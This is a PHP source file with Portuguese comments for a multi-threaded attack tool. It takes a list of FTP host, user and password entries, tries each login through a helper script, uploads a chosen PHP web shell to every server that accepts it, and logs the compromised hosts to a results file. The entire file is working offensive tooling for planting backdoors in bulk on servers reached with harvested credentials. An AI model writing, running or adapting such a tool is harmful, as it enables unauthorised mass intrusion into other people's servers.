<?php
  
  /*
  ** Multi-thread PHP FTP auto upload shell - v1.0.
  ** Autor: Constantine - 06/2015.
  ** Uso: php app.php lista-de-logins-ftp.txt php-shell.php número de threads
  ** Exemplo: php app.php list-of-ftp-logins.txt shell.php 10
  ** Sintaxe da lista de login FTP: host.com;user;pass (separados por ENTER).
  */
  
  error_reporting(0);
  include __DIR__ . '/threads.php';
  
  class Application {
    private $list;
    private $shell;
    private $threads;
    private $output;
    private $flag;
    
    /*
    ** Inicializa atributos da classe.
    */
    public function __construct () {
      if ($_SERVER['argc'] != 4) {
        $this->banner();
        die("   Uso: php app.php list-of-ftp-logins.txt php-shell.php number of threads\n".
            "   Ex.: php app.php list-of-ftp-logins.txt shell.php 10\n\n");
      }
      
      if ($this->check($_SERVER['argv'][1]) && $this->check($_SERVER['argv'][2]) && 
          $this->check($_SERVER['argv'][3]))
      {
        $this->flag = false;
        $this->output = 'results.txt';
        $this->list = $_SERVER['argv'][1];
        $this->shell = $_SERVER['argv'][2];
        $this->threads = $_SERVER['argv'][3];
        
        if (file_exists($this->shell) && file_exists($this->list))
          $this->flag = true;
      }
    }
    
    /*
    ** Core do programa, controle das threads.
    */
    public function running () {
      if ($this->flag) {
        $this->banner();
        print " Starting...\n\n";
        if (($fp = fopen($this->list, 'r')) != null) {
          $total_shells = 0;
          $total_ftps = 0;
          while (!feof($fp)) {
            
            $commands = array();
            for ($a=0; $a < $this->threads; $a++) {
              $commands[] = $this->get_command(fgets($fp));
              $tmp = explode(" ", $commands[$a]);
              print " [". $total_ftps++ ."] - Checking -> {$tmp[2]}:{$tmp[3]} - {$tmp[4]}:{$tmp[5]}...\n";
            }
            
            $threads = new Multithread($commands);
            $threads->run();
            
            foreach ($threads->commands as $key=>$command)
              if (strstr($threads->output[$key], 'success')) {
                $response = explode(";", $threads->output[$key]);
                $response = $response[0];
                $this->save("{$response}\n");
                $total_shells++;
                print " -> [{$total_shells}] Shell uploaded: {$response}\n";
              }
          }
          fclose($fp);
        }
      }
    }
    
    /*
    ** Parseia linha de entrada.
    **  @data - Linha a ser parseada.
    **  Retorno: Comando formatado para ser usado na criação da thread.
    */
    private function get_command ($data) {
      $line = explode(";", str_replace("\n", '', $data));
      return "php FTPChecker.php {$line[0]} 21 {$line[1]} {$line[2]} {$this->shell} 5";
    }
    
    /*
    ** Salva buffer em arquivo de log.
    **  @data - Dados a serem salvos.
    */
    private function save ($data) {
      if ($this->check($data))
        if (($fp = fopen($this->output, 'a+')) != null) {
          fprintf($fp, $data);
          fclose($fp);
        }
    }
    
    /* Verifica se variável contém dados. */
    private function check ($data) {
      if (!empty($data) && strlen($data) > 0 && $data != null)
        return true;
      return false;
    }
    
    /* Exibe banner. */
    private function banner () {
      $buffer  = "\n\n     __, ___ __,    _, _,_ __,  _, _,_ __, __,  v1.0\n";
      $buffer .= "     |_   |  |_)   / ` |_| |_  / ` |_/ |_  |_)\n";
      $buffer .= "     |    |  |     \\ , | | |   \\ , | \\ |   | \\\n";
      $buffer .= "     ~    ~  ~      ~  ~ ~ ~~~  ~  ~ ~ ~~~ ~ ~\n";
      $buffer .= "   Coded by Constantine - 2015 - github.com/jessesilva                 \n";
      $buffer .= "                                             \n";
      print $buffer;
    }
  }
  
  $app = new Application();
  $app -> running();
  
?>